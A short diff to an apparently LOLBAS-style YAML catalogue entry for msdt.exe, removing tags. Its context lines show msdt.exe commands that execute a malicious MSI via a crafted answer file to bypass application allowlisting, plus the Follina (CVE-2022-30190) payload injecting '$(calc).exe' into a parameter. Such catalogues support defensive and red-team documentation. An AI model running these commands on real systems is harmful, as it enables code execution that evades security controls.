@@ -14,7 +14,6 @@ Commands:
     Tags:
       - Application: GUI
       - Execute: MSI
-      - Input: Custom Format
   - Command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE
     Description: Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.
     Usecase: Execute code bypass Application whitelisting
@@ -25,7 +24,6 @@ Commands:
     Tags:
       - Application: GUI
       - Execute: MSI
-      - Input: Custom Format
   - Command: msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
     Description: Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.
     Usecase: Execute code bypass Application allowlisting
@@ -36,7 +34,6 @@ Commands:
     Tags:
       - Application: GUI
       - Execute: CMD
-      - Input: Custom Format
 Full_Path:
   - Path: C:\Windows\System32\Msdt.exe
   - Path: C:\Windows\SysWOW64\Msdt.exe
